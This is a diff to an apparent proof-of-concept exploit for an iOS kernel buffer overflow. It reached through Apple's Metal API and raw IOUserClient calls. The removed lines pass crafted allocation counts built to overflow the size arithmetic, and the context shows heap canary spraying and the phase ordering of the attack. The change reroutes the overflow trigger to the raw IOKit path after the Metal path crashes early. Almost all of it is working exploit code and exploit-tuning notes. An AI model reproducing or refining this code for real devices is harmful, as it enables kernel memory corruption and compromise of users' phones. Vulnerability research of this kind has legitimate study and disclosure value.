@@ -159,31 +159,11 @@ static void trigger_bof(id<MTLDevice> dev) {
          * count=0x80000000 (INT32_MIN as int32): smull overflows
          * to large 64-bit value -> kalloc fails but interesting. */
 
-        /* Variant A: count chosen so (count*24)&0xFFFFFFFF + 8 = 8 (small alloc) */
-        const NSUInteger OVERFLOW_COUNT_A = 0x20000000ULL;
-        evf("Metal overflow attempt A: addAllocations count=0x%llx",
-            (uint64_t)OVERFLOW_COUNT_A);
-        @try {
-            [rset addAllocations:arr count:OVERFLOW_COUNT_A];
-            evf("Metal overflow A: count accepted by Metal layer!");
-            [rset commit];
-            evf("Metal overflow A: committed to kernel - BOF may have triggered");
-        } @catch (NSException *ex) {
-            evf("Metal overflow A exception: %s", ex.reason.UTF8String);
-        }
-
-        /* Variant B: INT32_MIN as NSUInteger - tests signed overflow path */
-        const NSUInteger OVERFLOW_COUNT_B = (NSUInteger)(uint32_t)0x80000000U;
-        evf("Metal overflow attempt B: addAllocations count=0x%llx",
-            (uint64_t)OVERFLOW_COUNT_B);
-        @try {
-            [rset addAllocations:arr count:OVERFLOW_COUNT_B];
-            evf("Metal overflow B: count accepted by Metal layer!");
-            [rset commit];
-            evf("Metal overflow B: committed to kernel");
-        } @catch (NSException *ex) {
-            evf("Metal overflow B exception: %s", ex.reason.UTF8String);
-        }
+        /* Metal overflow attempts disabled: Metal iterates arr before kernel call
+         * causing SIGSEGV when arr has only 64 elements but count=0x20000000.
+         * Overflow must be triggered via raw IOKit path in trigger_bof_iokit(). */
+        evf("Metal API path baseline confirmed (count=4 OK)");
+        evf("Metal overflow requires raw IOKit path (Metal iterates arr pre-kernel)");
 
     fallback_path:;
         /* Alternate trigger: MTLRenderCommandEncoder useResources */
@@ -388,11 +368,12 @@ void run_cve28882_poc(UIWindow *window) {
         /* Phase 1: Spray canaries */
         spray_canaries(dev);
 
-        /* Phase 2: Trigger via Metal API (safe layer) */
-        trigger_bof(dev);
-
-        /* Phase 3: Trigger via raw IOUserClient (bypass Metal layer) */
+        /* Phase 2: Raw IOUserClient probe (must run before Metal overflow) */
         trigger_bof_iokit();
+
+        /* Phase 3: Trigger via Metal API — overflow attempt crashes via SIGSEGV
+         * if Metal iterates pointers; skip Metal overflow, just baseline test */
+        trigger_bof(dev);
 
         /* Phase 4: Check canaries */
         dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2*NSEC_PER_SEC),
